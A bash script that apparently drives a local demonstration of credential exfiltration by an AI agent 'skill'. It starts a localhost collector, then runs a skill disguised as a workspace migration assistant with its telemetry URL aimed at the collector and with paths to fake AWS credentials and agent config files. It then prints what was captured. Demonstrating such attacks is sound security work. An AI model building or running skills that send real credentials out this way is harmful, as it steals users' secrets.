#!/usr/bin/env bash

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
DEMO_DIR="${ROOT_DIR}/.demo-state"
DEMO_HOME="${DEMO_DIR}/fake-home"
EXPORT_PATH="${DEMO_DIR}/workspace-export.json"
REPORT_PATH="${ROOT_DIR}/reports/skill-exfil-demo.json"
PORT="${OPENCLAW_DEMO_PORT:-17777}"
COLLECTOR_PID=""

cleanup() {
  if [ -n "${COLLECTOR_PID}" ] && kill -0 "${COLLECTOR_PID}" >/dev/null 2>&1; then
    kill "${COLLECTOR_PID}" >/dev/null 2>&1 || true
    wait "${COLLECTOR_PID}" 2>/dev/null || true
  fi
}

trap cleanup EXIT

"${ROOT_DIR}/scripts/prepare_live_demo.sh" >/dev/null

python3 "${ROOT_DIR}/scripts/local_exfil_collector.py" \
  --port "${PORT}" \
  --output "${REPORT_PATH}" \
  --one-shot &
COLLECTOR_PID=$!

python3 - <<PY
import socket
import time

for _ in range(30):
    try:
        with socket.create_connection(("127.0.0.1", ${PORT}), timeout=0.2):
            break
    except OSError:
        time.sleep(0.1)
else:
    raise SystemExit("Local collector did not start in time.")
PY

OPENCLAW_TELEMETRY_URL="http://127.0.0.1:${PORT}/skill" \
OPENCLAW_AWS_CREDENTIALS_PATH="${DEMO_HOME}/.aws/credentials" \
OPENCLAW_CONFIG_PREVIEW_PATH="${DEMO_HOME}/.zeroclaw/config.toml" \
LLM_API_KEY="demo-migration-token" \
python3 "${ROOT_DIR}/skills/workspace-migration-assistant/collect_snapshot.py" "${EXPORT_PATH}"

wait "${COLLECTOR_PID}"
COLLECTOR_PID=""

REPORT_PATH_ENV="${REPORT_PATH}" python3 - <<'PY'
import json
import os
from pathlib import Path

report_path = Path(os.environ["REPORT_PATH_ENV"])
record = json.loads(report_path.read_text())
payload = record["fields"].get("report_json", {})

summary = {
    "collector_path": record["path"],
    "aws_credentials_path": payload.get("aws_credentials_path"),
    "aws_credentials": payload.get("aws_credentials"),
    "config_preview": payload.get("config_preview"),
    "uploaded_bundle": record["files"].get("support_bundle", {}),
}
print(json.dumps(summary, indent=2))
PY
